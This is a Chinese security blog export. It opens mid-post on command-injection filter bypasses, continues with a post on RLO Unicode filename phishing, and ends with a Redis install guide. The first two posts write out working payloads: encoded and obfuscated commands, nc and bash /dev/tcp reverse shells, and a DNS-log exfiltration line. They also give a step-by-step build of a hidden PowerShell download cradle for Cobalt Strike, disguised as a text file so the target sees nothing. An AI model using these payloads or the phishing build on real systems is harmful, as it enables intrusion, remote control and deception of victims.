<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>) ==&gt;ls</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) ==&gt;cat /flag</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\<span class="variable">$0</span> ==&gt;cat /flag</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;例子</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali: $(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>)</span><br><span class="line">firefox-esr.desktop  flag</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633322424412-795e4986-e034-4426-89e3-b65fd5ea4060.png" alt="img"></p>
<h4 id="b、Base64编码"><a href="#b、Base64编码" class="headerlink" title="b、Base64编码"></a>b、Base64编码</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali: `<span class="built_in">echo</span> <span class="string">&#x27;Y2F0Cg==&#x27;</span> | base64 -d` flag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>

<h3 id="（6）空格过滤"><a href="#（6）空格过滤" class="headerlink" title="（6）空格过滤"></a>（6）空格过滤</h3><h4 id="a、-IFS"><a href="#a、-IFS" class="headerlink" title="a、${IFS}"></a>a、${IFS}</h4><p>&emsp;&emsp;在shell中，有一个好用的环境变量$IFS，IFS表示 Internal Field Separator （内部字段分隔符），默认是空格符</p>
<p>&emsp;&emsp;bash下的很多命令都会分割单词，绝大多数时候默认是采用空格作为分隔符，有些时候遇到制表符、换行符也会进行分隔。最典型的是”<code>for i in a b c</code>“，它会分割变量列表”a b c”使其成为三个变量。这种分隔符是由IFS变量指定的</p>
<p>&emsp;&emsp;默认的IFS在碰到空格、制表符<code>\t</code>和分行符<code>\n</code>就会自动分隔进入下一步。但是对空格处理有点不一样，对行首和行尾两边的空格不处理，并且多个连续的空格默认当作一个空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;/etc/passwd</span><br></pre></td></tr></table></figure>

<h4 id="b、-IFS-9"><a href="#b、-IFS-9" class="headerlink" title="b、$IFS$9"></a>b、$IFS$9</h4><p>&emsp;&emsp;$9指传过来的第9个参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali: cat$IFS<span class="variable">$9flag</span></span><br><span class="line">you are good!</span><br><span class="line">kali@kali: cat$IFS<span class="variable">$1flag</span></span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>

<h4 id="c、-20、-09-tab-（需要PHP环境，不演示）"><a href="#c、-20、-09-tab-（需要PHP环境，不演示）" class="headerlink" title="c、%20、%09(tab)（需要PHP环境，不演示）"></a>c、%20、%09(tab)（需要PHP环境，不演示）</h4><h4 id="d、-lt-或者-lt-gt-重定向"><a href="#d、-lt-或者-lt-gt-重定向" class="headerlink" title="d、&lt;或者&lt;&gt;重定向"></a>d、&lt;或者&lt;&gt;重定向</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali: cat&lt;flag</span><br><span class="line">you are good!</span><br><span class="line">kali@kali: cat&lt;&gt;flag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>

<h3 id="（7）nc反弹shell"><a href="#（7）nc反弹shell" class="headerlink" title="（7）nc反弹shell"></a>（7）nc反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.0.104 3456</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633247395015-828dfe20-b924-4d3f-892d-f329491d7cdb.png" alt="img"></p>
<p>&emsp;&emsp;为了避免符号，可以将IP地址转换成整型：<code>nc -e /bin/bash 3232235624 3456</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633248897612-0ac7c357-e92b-4a20-b311-110f5b2d8475.png" alt="img"></p>
<p>&emsp;&emsp;使用通配符： <code>/??n/?c -e /??n/b??h 3232235624 3456</code></p>
<p>&emsp;&emsp;或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">黑客：nc -lvv 8888</span><br><span class="line">靶机：?cmd=bash -i &gt;&amp; /dev/tcp/x.x.x.x/8888 0&gt;&amp;1</span><br><span class="line">  [+] bash -i，意为创建一个交互式的bash shell</span><br><span class="line">  [+] 0，STDIN_FILENO，标准输入（一般是键盘）</span><br><span class="line">  		1，STDOUT_FILENO，标准输出（一般是显示屏，准确的说是用户终端控制台）</span><br><span class="line">			2，STDERR_FILENO，标准错误（出错信息输出）</span><br><span class="line">      1&gt;，只写&gt;而省略不写数字则默认就是 1</span><br><span class="line">      同理，输入重定向0&lt;省略不写则默认就是 0</span><br><span class="line">  [+] 2&gt;&amp;1&amp;的意义，用来将标准错误2重定向到标准输出1中的。此处1前面的&amp;就是为了让bash将1解释成标准输出而不是文件1。至于最后一个&amp;，则是让bash在后台执行。</span><br><span class="line">  [+] /dev/tcp/192.168.1.1/8888，这是一个特殊文件，它会建立一个连接到192.168.1.1:8888的socket</span><br><span class="line">意思就是：bash -i创建一个交互式的bash，&amp;&gt;将bash的标准输出重定向到/dev/tcp/192.168.1.1/9090的socket连接上，0&gt;&amp;1将标准输入重定向到标准输出，最终的结果就是标准输入也被重定向到了TCP连接中，因此输入和输出都可以在公网主机上进行，通过TCP连接和bash进行交互。</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://blog.csdn.net/Auuuuuuuu/article/details/89059176">https://blog.csdn.net/Auuuuuuuu/article/details/89059176</a></p>
<h3 id="（8）使用未初始化的bash变量"><a href="#（8）使用未初始化的bash变量" class="headerlink" title="（8）使用未初始化的bash变量"></a>（8）使用未初始化的bash变量</h3><p>&emsp;&emsp;在bash环境中允许我们使用未初始化的bash变量，比如 $a,$b,$c 我们事先并没有定义它们，输出看看: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo $a</span></span><br><span class="line">root@kali:~<span class="comment"># echo $b</span></span><br><span class="line">root@kali:~<span class="comment"># echo $c</span></span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;未初始化的变量值都是Null</p>
<p>&emsp;&emsp;读取/etc/passwd： <code>cat$a /etc$a/passwd$a</code></p>
<p>&emsp;&emsp;测试WAF：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">system(<span class="string">&#x27;dig&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;which指令会在环境变量$PATH设置的目录里查找符合条件的文件 ，先找出nc文件路径：<code>www.baidu.com;$s/bin$s/which$s nc$s</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633250227589-dd8bb4a3-18ff-4dc9-b09a-0cc7b4b19ff5.png" alt="img"></p>
<p>&emsp;&emsp;知道nc在哪里了，反弹shell：<code>www.baidu.com;/bin$s/nc$s -e/bin$s/bash$s 3232235624 3456</code>，-e后面有没有空格都可以</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633250407411-79561858-c711-4be4-a3a7-20720d1f018d.png" alt="img"></p>
<h2 id="2、有的文件无法执行"><a href="#2、有的文件无法执行" class="headerlink" title="2、有的文件无法执行"></a>2、有的文件无法执行</h2><p>&emsp;&emsp;先赋予执行权限再运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chm<span class="string">&#x27;o&#x27;</span>d 777 ./key.php</span><br><span class="line">chm\o\d 777 ./key.php</span><br></pre></td></tr></table></figure>

<h2 id="3、直接读取文件"><a href="#3、直接读取文件" class="headerlink" title="3、直接读取文件"></a>3、直接读取文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;curl file:///etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="4、利用dnslog或者http-web-log"><a href="#4、利用dnslog或者http-web-log" class="headerlink" title="4、利用dnslog或者http web log"></a>4、利用dnslog或者http web log</h2><p><code>ls | curl xxx.ceye.io/</code>whoami``</p>
<h2 id="5、绕过长度限制"><a href="#5、绕过长度限制" class="headerlink" title="5、绕过长度限制"></a>5、绕过长度限制</h2><h3 id="（1）-gt-和-gt-gt"><a href="#（1）-gt-和-gt-gt" class="headerlink" title="（1）&gt;和&gt;&gt;"></a>（1）&gt;和&gt;&gt;</h3><p>&emsp;&emsp;使用<code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入</p>
<p>&emsp;&emsp;<code>&gt;&gt;</code>符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</p>
<h3 id="（2）命令换行"><a href="#（2）命令换行" class="headerlink" title="（2）命令换行"></a>（2）命令换行</h3><p>&emsp;&emsp;换行执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/桌面$ ca\</span><br><span class="line">&gt; t\</span><br><span class="line">&gt;  fl\</span><br><span class="line">&gt; ag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633255171524-a53d15bd-6513-48e6-bc8d-d4184af09a48.png" alt="img"></p>
<p>&emsp;&emsp;可以尝试写一个文件来执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali: <span class="built_in">echo</span> <span class="string">&quot;ca\\&quot;</span>&gt;shell</span><br><span class="line">kali@kali: <span class="built_in">echo</span> <span class="string">&quot;t\\&quot;</span>&gt;&gt;shell</span><br><span class="line">kali@kali: <span class="built_in">echo</span> <span class="string">&quot; fl\\&quot;</span>&gt;&gt;shell</span><br><span class="line">kali@kali: <span class="built_in">echo</span> <span class="string">&quot;ag&quot;</span>&gt;&gt;shell</span><br><span class="line">kali@kali: cat shell</span><br><span class="line">ca\</span><br><span class="line">t\</span><br><span class="line"> fl\</span><br><span class="line">ag</span><br><span class="line">kali@kali: sh shell</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633255279702-ce2e93c8-a321-4975-bbe2-00f1df1dfdf5.png" alt="img"></p>
<h2 id="6、内敛执行绕过"><a href="#6、内敛执行绕过" class="headerlink" title="6、内敛执行绕过"></a>6、内敛执行绕过</h2><p>&emsp;&emsp;<code>命令</code>和<code>$(命令)</code>都是执行命令的方式</p>
<p>&emsp;&emsp;例子</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali: <span class="built_in">echo</span> <span class="string">&quot;m0re`cat flag`&quot;</span></span><br><span class="line">m0reyou are good!</span><br><span class="line">kali@kali: <span class="built_in">echo</span> <span class="string">&quot;m0re <span class="subst">$(cat flag)</span>&quot;</span></span><br><span class="line">m0re you are good!</span><br><span class="line">kali@kali: <span class="built_in">echo</span> <span class="string">&quot;m0re <span class="subst">$(pwd)</span>&quot;</span></span><br><span class="line">m0re /root</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633255434719-19e8a4fc-b36d-4a36-859a-6a6c88da8a58.png" alt="img"></p>
<h1 id="四、涉及资源"><a href="#四、涉及资源" class="headerlink" title="四、涉及资源"></a>四、涉及资源</h1><ul>
<li><p><a href="https://www.cnblogs.com/ermei/p/6689005.html">JAVA web网站代码审计－－入门</a></p>
</li>
<li><p><a href="https://wolke.cn/post/4f87817f.html">PHP 远程代码执行漏洞复现（CVE-2019-11043）</a></p>
</li>
<li><p><a href="https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe">墨者靶场——PHP代码分析溯源(第4题)</a></p>
</li>
<li><p><a href="https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe">墨者靶场——命令注入执行分析</a></p>
</li>
<li><p><a href="https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe">墨者靶场——Webmin未经身份验证的远程代码执行</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>RLO的Unicode反转文件后缀钓鱼</title>
    <url>/post/5653cc29.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、初体验"><a href="#一、初体验" class="headerlink" title="一、初体验"></a>一、初体验</h1><p>Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。而如上技术正是使用了Unicode的RLO（开始从左向右覆盖），Unicode定义的 Start of right-to-left override，控制字符是RLO，ASCII码是0x3F。只要在一行字符前面加上一个0x3F就可以实现文本的反向排列。这个0x3F是Unicode为了兼容阿拉伯文字从左至右的阅读习惯设计的一个转义字符。</p>
<p>大致原理就是，在<strong>Windows</strong>下面，支持一种特殊的Unicode字符RLO，一个字符串中如果有这个字符，那么在<strong>Windows</strong>下显示时，就会把RLO<strong>右侧</strong>的字符串<strong>逆序</strong>显示出来</p>
<p>例如，原始字符串：<code>abcd[RLO]efgh</code>，在Windows下显示为：<code>abcdhgfe</code>，攻击者可以利用这个特性，把exe文件伪装成一个文本或图片文件，用户在双击时恶意文件便得到执行。</p>
<p><strong>【示例】</strong></p>
<p>我们新建一个<code>txt.bat</code>内容为<code>start calc.exe</code>，点击重命名选择插入Unicode控制字符，选择RLO此时文件名称会变为<code>tab.txt</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646642410885-618477dd-aad0-407a-b162-e4e5d26d2dce.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646642986430-22a41b2d-7f58-482d-a419-876ec970070e.png" alt="img"></p>
<h1 id="二、结合使用CobaltStrike"><a href="#二、结合使用CobaltStrike" class="headerlink" title="二、结合使用CobaltStrike"></a>二、结合使用CobaltStrike</h1><h2 id="1、生成监听器"><a href="#1、生成监听器" class="headerlink" title="1、生成监听器"></a>1、生成监听器</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646643109069-9f807e6c-fa9c-4f8a-9536-f60150abc30a.png" alt="img"></p>
<h2 id="2、生成powershell木马"><a href="#2、生成powershell木马" class="headerlink" title="2、生成powershell木马"></a>2、生成powershell木马</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646644825237-38621909-5d1e-46dd-aaf3-e40f923738ac.png" alt="img"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.4.13.124:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="3、使用BAT2EXE将BAT转换为EXE"><a href="#3、使用BAT2EXE将BAT转换为EXE" class="headerlink" title="3、使用BAT2EXE将BAT转换为EXE"></a>3、使用BAT2EXE将BAT转换为EXE</h2><p>将以下内容保存为<code>test.bat</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.4.13.124:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<p>下载安装BAT2EXE，打开该工具，点击open导入前面创建的<code>test.bat</code>，然后将“<code>notepad</code>”添加到<code>test.bat</code>的顶部，点击右侧的icon选择一个txt文本图标。然后将exe格式更改为“64位Windows（隐形）”，以防止在目标用户打开文件时弹出任何终端，最后点击convert转换</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646646219620-54fbe32e-861a-4b7f-8110-64fa1796af6c.png" alt="img"></p>
<p>保存为<code>txt.bat</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646645293273-76fafcd2-db83-4edc-baed-f4f0eefd4a8d.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646646264737-9e49ab16-0212-4a2e-9c67-3bc44ef2373b.png" alt="img"></p>
<h2 id="4、RLO伪装EXE后缀为TXT"><a href="#4、RLO伪装EXE后缀为TXT" class="headerlink" title="4、RLO伪装EXE后缀为TXT"></a>4、RLO伪装EXE后缀为TXT</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646646308693-37391d13-8fce-4695-b237-a0fca6aebdb7.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646646323004-da9fedb3-b1b9-4940-8c09-d8b2bf967e03.png" alt="img"></p>
<h2 id="5、反弹shell"><a href="#5、反弹shell" class="headerlink" title="5、反弹shell"></a>5、反弹shell</h2><p>下面的动图，展示了打开一个TXT钓鱼文件时，逼真的打开了记事本，然后在背后悄悄的上了线：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646647546873-7c0dd18c-6385-42b9-a944-d7e991ac4947.gif" alt="img"></p>
<h1 id="三、附录"><a href="#三、附录" class="headerlink" title="三、附录"></a>三、附录</h1><ul>
<li><p><a href="http://www.icosky.com/icon/notepad-13-icon/">各种图标ico下载</a></p>
</li>
<li><p><a href="https://www.bat2exe.net/">命令行的BAT2EXE下载</a></p>
</li>
<li><p><a href="https://www.jb51.net/softs/202873.html">图形化的BAT2EXE下载</a></p>
</li>
</ul>
<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><ul>
<li><p><a href="https://cloud.tencent.com/developer/article/1799424">https://cloud.tencent.com/developer/article/1799424</a></p>
</li>
<li><p><a href="https://blog.csdn.net/mgxcool/article/details/50637346">https://blog.csdn.net/mgxcool/article/details/50637346</a></p>
</li>
<li><p><a href="https://www.freebuf.com/articles/network/320964.html">https://www.freebuf.com/articles/network/320964.html</a></p>
</li>
<li><p><a href="https://blog.csdn.net/qq_23452385/article/details/109145151">https://blog.csdn.net/qq_23452385/article/details/109145151</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>APT/社工</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
        <tag>钓鱼</tag>
        <tag>社工</tag>
        <tag>APT</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis安全</title>
    <url>/post/472fbc5b.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Redis介绍"><a href="#一、Redis介绍" class="headerlink" title="一、Redis介绍"></a>一、Redis介绍</h1><p>Redis（Remote Dictionary Server）译为“远程字典服务”，它是一款基于内存实现的键值型 NoSQL 数据库， 通常也被称为数据结构服务器，这是因为它可以存储多种数据类型，比如 string（字符串），hash（哈希散列），list（列表），set（集合）和 sorted set（有序集合）等。  可以对内存中的数据直接存取，也可以写到硬盘中去。默认端口为6379</p>
<p>Nosql数据库的特点是：</p>
<ol>
<li><p><strong>容易扩展</strong>：NoSQL数据库种类繁多，但是一个共同的特点都是去掉关系数据库的关系型特性。数据之间无关系，这样就非常容易扩展。无形之间，在架构的层面上带来了可扩展的能力。</p>
</li>
<li><p><strong>大数据量、高性能</strong>：NoSQL数据库都具有非常高的读写性能，尤其在大数据量下，同样表现优秀。这得益于它的无关系性，数据库的结构简单。 一般MySQL使用Query Cache。NoSQL的Cache是记录级的，是一种细粒度的Cache，所以NoSQL在这个层面上来说性能就要高很多。</p>
</li>
<li><p><strong>灵活的数据模型</strong>：NoSQL无须事先为要存储的数据建立字段，随时可以存储自定义的数据格式。而在关系数据库里，增删字段是一件非常麻烦的事情。如果是非常大数据量的表，增加字段简直就是——个噩梦。这点在大数据量的Web 2.0时代尤其明显。</p>
</li>
<li><p><strong>高可用</strong>：NoSQL在不太影响性能的情况，就可以方便地实现高可用的架构。比如Cassandra、HBase模型，通过复制模型也能实现高可用。</p>
</li>
</ol>
<p>nosql数据库种类繁多，但是它们都有一个共同的特点，就是它们都去掉了关系数据库的关系型特性，使用键值型</p>
<h1 id="二、Ubuntu部署Redis"><a href="#二、Ubuntu部署Redis" class="headerlink" title="二、Ubuntu部署Redis"></a>二、Ubuntu部署Redis</h1><h2 id="1、下载和安装"><a href="#1、下载和安装" class="headerlink" title="1、下载和安装"></a>1、下载和安装</h2><p>我这里使用的是Ubuntu进行下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645523488110-53e105c2-223f-41e5-a65d-4fd43ad1ac95.png" alt="img"></p>
<p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar zxvf redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645523570500-ff578715-d8aa-46fd-b465-b17f007d6262.png" alt="img"></p>
<p>移动解压后的文件夹到/usr/local/redis目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mv ./redis-4.0.9 /usr/<span class="built_in">local</span>/redis</span><br></pre></td></tr></table></figure>

<p>进入到/usr/local/redis目录下，make test编译一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645524129274-562a6cf2-ced1-4d6b-9d10-7dcc50c9f486.png" alt="img"></p>
<p>报错了，执行以下命令即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make distclean &amp;&amp; make</span><br></pre></td></tr></table></figure>

<p>错误的本质是我们在开始执行make 时遇到了错误（大部分是由于gcc未安装），然后我们安装好了gcc 后，我们再执行make ,这时就出现了jemalloc/jemalloc.h: No such file or directory。这是因为上次的编译失败，有残留的文件，我们需要清理下，然后重新编译就可以了。</p>
<p>提示以下信息说明没问题了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645524281458-42609eb0-b6d5-49dc-b2d4-88f44c30f790.png" alt="img"></p>
<p>再次执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>​    大概8分钟左右的编译后，出现绿色字体的信息，说明没问题</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645524536236-965371c5-0d16-45a9-a0f5-05f029799ec9.png" alt="img"></p>
<p>进入/usr/local/redis/src目录下，看到有以下命令，说明的确没问题了，编译安装成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645525178655-88970cfb-3795-497d-a725-3bd2f527426a.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方便找到</span></span><br><span class="line">sudo mkdir /etc/redis  </span><br><span class="line">sudo cp /usr/<span class="built_in">local</span>/redis/redis.conf /etc/redis/</span><br></pre></td></tr></table></figure>

<h2 id="2、修改配置文件"><a href="#2、修改配置文件" class="headerlink" title="2、修改配置文件"></a>2、修改配置文件</h2><p>修改并保存配置文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645525604213-c1573a3b-0a79-492d-888e-b0ba2048ef36.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645525689314-005cc03f-d38c-4ca1-9f96-6f81c5fe7668.png" alt="img"></p>
<h2 id="3、运行Redis服务端"><a href="#3、运行Redis服务端" class="headerlink" title="3、运行Redis服务端"></a>3、运行Redis服务端</h2><p>以/etc/redis/redis.conf的配置文件启动Redis服务端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526033144-130b20b8-697b-4fae-8a47-448836eea2cf.png" alt="img"></p>
<p>查看是否开启Redis</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526083476-9ebf168d-d3c9-4b77-a5ea-b68135e52b98.png" alt="img"></p>
<h2 id="4、客户端连接服务端"><a href="#4、客户端连接服务端" class="headerlink" title="4、客户端连接服务端"></a>4、客户端连接服务端</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./redis-cli -h 192.168.1.117</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526186105-169f58ac-a632-47eb-8d1f-ce31b97b8523.png" alt="img"></p>
<p>可以看到，当保存了数据后，src目录下会有dump.rdb，看一下可以大概知道，这应该存储了当时我们创建的键值对（当然，如果通过cp命令将redis-server加入到/usr/bin目录下，那么在当前目录下运行的redis，那么就会在当前目录下生成dump.rdb，不一定在src目录下）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526490598-5b3c6f74-8f7a-46fd-821b-b17840a87b03.png" alt="img"></p>
<blockquote>
<p>这里可以知道，默认情况下，连接Redis是无需密码的，因此日常可以会因为管理员疏忽而存在Redis未授权登录的问题（用Telnet也可以连接 telnet IP port）</p>
<p>因为官方说明save默认保存的是rdb文件，redis-bits?@?ctime就是rdb标识符，实战可以把它看成脏数据</p>
</blockquote>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645530806268-9cd8c3a5-05c7-4210-b3c3-8aa361e79449.png" alt="img"></p>
<h1 id="三、Kali安装Redis-cli"><a href="#三、Kali安装Redis-cli" class="headerlink" title="三、Kali安装Redis-cli"></a>三、Kali安装Redis-cli</h1><h2 id="1、下载安装"><a href="#1、下载安装" class="headerlink" title="1、下载安装"></a>1、下载安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528502054-4a6bff5a-b284-4fb0-abcf-205d30aa1962.png" alt="img"></p>
<p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf redis-stable.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528593285-d83a5d04-e3aa-48f5-94d4-bb087130d466.png" alt="img"></p>
<p>可以看到有个makefile，直接make，全局生效</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528682454-82a06dc6-102e-4d76-aaf7-a0fc9054b4ac.png" alt="img"></p>
<h2 id="2、加入环境变量"><a href="#2、加入环境变量" class="headerlink" title="2、加入环境变量"></a>2、加入环境变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo cp redis-cli /usr/bin</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528812989-8d8da347-9f2c-4620-9649-451fd42aa4a7.png" alt="img"></p>
<h2 id="3、连接Ubuntu的Redis服务"><a href="#3、连接Ubuntu的Redis服务" class="headerlink" title="3、连接Ubuntu的Redis服务"></a>3、连接Ubuntu的Redis服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.1.117</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528911828-cc0efb3d-0deb-43ed-9855-614936748041.png" alt="img"></p>
<h1 id="四、设置密码登录"><a href="#四、设置密码登录" class="headerlink" title="四、设置密码登录"></a>四、设置密码登录</h1><p>之前说过，默认情况下Redis是免密登陆的，那么就存在未授权登录的风险。那么如何设置密码登录呢？</p>
<p>打开配置文件，配置密码为<code>haha123</code>，如图所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">requirepass haha123</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534540030-7b2f3654-7cfe-4b5f-b037-d421836f56be.png" alt="img"></p>
<p>关闭Redis服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shutdown</span><br><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534802364-bd7724fe-8485-4181-981d-013714f67cc1.png" alt="img"></p>
